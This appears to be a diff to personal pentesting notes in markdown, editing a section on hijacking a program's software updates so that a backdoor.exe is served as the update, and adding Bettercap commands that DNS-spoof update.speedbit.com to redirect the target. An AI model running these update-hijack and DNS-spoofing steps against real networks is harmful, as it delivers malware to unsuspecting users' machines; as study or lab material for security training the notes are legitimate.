@@ -96,7 +96,6 @@ show modules
 ```
 To get a list of all the programsthat we can hijack their updates
 ```
-show modules
 configure dap
 show options
 ```
@@ -119,12 +118,18 @@ it will say, "Yes, there is an update,"
 and it will serve the backdoor.exe as the update.
 
 Bettercap
-
+```
 bettercap -iface eth0 -caplet /.cap
-
-
-
-
+```
+We also need to use Bettercap to run a DNS spoofing attack
+and spoof any request to update.speedbit.com  
+This is the domain that the target program usesto check for updates
+```
+set dns.spoof.all true
+set dns.spoof.domains update.speedbit.com
+dns.spoof on
+```
+start the listener
 
 ## Pentesting Resources
 https://github.com/swisskyrepo/PayloadsAllTheThings  
